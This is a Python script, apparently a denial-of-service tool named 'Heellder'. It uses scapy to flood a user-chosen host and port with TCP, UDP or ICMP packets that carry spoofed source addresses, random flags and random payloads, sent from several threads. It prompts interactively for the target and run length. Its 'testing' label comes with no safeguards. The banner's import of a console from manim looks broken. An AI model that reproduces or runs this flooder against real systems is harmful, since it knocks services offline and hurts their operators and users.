from manim import console
import scapy.all as scapy
import random
import socket
import threading
import time
import statistics


console.print(
        """
[bold red]
████████╗ ██████╗ ██╗  ██╗██╗   ██╗ ██████╗  ██████╗
╚══██╔══╝██╔═══██╗██║ ██╔╝╚██╗ ██╔╝██╔═══██╗██╔═══██╗
   ██║   ██║   ██║█████╔╝  ╚████╔╝ ██║   ██║██║   ██║
   ██║   ██║   ██║██╔═██╗   ╚██╔╝  ██║   ██║██║   ██║
   ██║   ╚██████╔╝██║  ██╗   ██║   ╚██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝

              Heellder v1.1
              Made by Tokyoo
[/bold red]
"""
    )

class DDoSTester:
    def __init__(self, target, protocol="tcp", duration=60, packet_count=10000, port=80, threads=4):
        self.target = self._resolve_target(target)
        self.protocol = protocol.lower()
        self.duration = duration
        self.packet_count = packet_count
        self.port = port
        self.threads = threads
        self.stop = False
        self.packets_sent = 0
        self.start_time = None
        self.lock = threading.Lock()
    
    
    def _resolve_target(self, target):
        """Resolve o nome de host para IP, se necessário."""
        try:
            return socket.gethostbyname(target)
        except socket.gaierror:
            raise ValueError(f"Não foi possível resolver o host: {target}")

    def _generate_packet(self):
        """Gera um pacote conforme o protocolo selecionado."""
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        dst_ip = self.target
        payload_size = random.randint(64, 1472)
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))

        if self.protocol == "tcp":
            flags = random.choice(["S", "R", "F", "P", "A"])
            sport = random.randint(1024, 65535)
            return (
                scapy.IP(src=src_ip, dst=dst_ip) /
                scapy.TCP(sport=sport, dport=self.port, flags=flags) /
                scapy.Raw(load=payload)
            )
        elif self.protocol == "udp":
            sport = random.randint(1024, 65535)
            return (
                scapy.IP(src=src_ip, dst=dst_ip) /
                scapy.UDP(sport=sport, dport=self.port) /
                scapy.Raw(load=payload)
            )
        elif self.protocol == "icmp":
            ident = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            return (
                scapy.IP(src=src_ip, dst=dst_ip) /
                scapy.ICMP(id=ident, seq=seq) /
                scapy.Raw(load=payload)
            )
        else:
            raise ValueError("Protocolo não suportado. Use 'tcp', 'udp' ou 'icmp'.")

    def _worker(self):
        """Thread worker para envio de pacotes."""
        while not self.stop and self.packets_sent < self.packet_count:
            try:
                packet = self._generate_packet()
                scapy.send(packet, verbose=False)
                with self.lock:
                    self.packets_sent += 1
            except Exception as e:
                print(f"Erro ao enviar pacote: {e}")
                break
            time.sleep(0.0005)  # 0.5ms de intervalo por thread

    def start(self):
        """Inicia o teste de DDoS com múltiplas threads."""
        print(f"Iniciando teste: {self.protocol.upper()} -> {self.target}:{self.port}")
        print(f"Configuração: {self.duration}s, {self.packet_count} pacotes, {self.threads} threads")
        
        self.stop = False
        self.packets_sent = 0
        self.start_time = time.time()
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            threads.append(t)

        # Loop de monitoramento
        try:
            while not self.stop and (time.time() - self.start_time) < self.duration:
                time.sleep(1)
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"\r[Monitor] Tempo: {elapsed:.1f}s | Pacotes: {self.packets_sent} | PPS: {pps:.1f} | Restante: {max(0, self.packet_count - self.packets_sent)}", end="")
        except KeyboardInterrupt:
            print("\nInterrompido pelo usuário.")
            self.stop = True

        self.stop = True
        for t in threads:
            t.join()

        # Estatísticas finais
        total_time = time.time() - self.start_time
        avg_pps = self.packets_sent / total_time if total_time > 0 else 0
        print("\n\n=== Estatísticas Finais ===")
        print(f"Duração Total: {total_time:.2f}s")
        print(f"Pacotes Enviados: {self.packets_sent}")
        print(f"PPM (Pacotes por Minuto): {avg_pps * 60:.0f}")
        print(f"PPS Médio: {avg_pps:.1f}")

    def stop_test(self):
        """Para o teste de DDoS."""
        self.stop = True

def main():
    """Interface interativa para configuração do teste."""
    print("=" * 50)
    print("  Gerador de DDoS Leve para Testes de Invasão")
    print("=" * 50)
    
    target = input("Alvo (IP ou Hostname): ").strip()
    protocol = input("Protocolo (tcp/udp/icmp) [tcp]: ").strip() or "tcp"
    port = int(input("Porta de destino [80]: ").strip() or "80")
    duration = int(input("Duração em segundos [60]: ").strip() or "60")
    packet_count = int(input("Número de pacotes [10000]: ").strip() or "10000")
    threads = int(input("Número de threads [4]: ").strip() or "4")

    try:
        tester = DDoSTester(
            target=target,
            protocol=protocol,
            duration=duration,
            packet_count=packet_count,
            port=port,
            threads=threads
        )
        tester.start()
    except Exception as e:
        print(f"Erro na execução: {e}")

if __name__ == "__main__":
    main()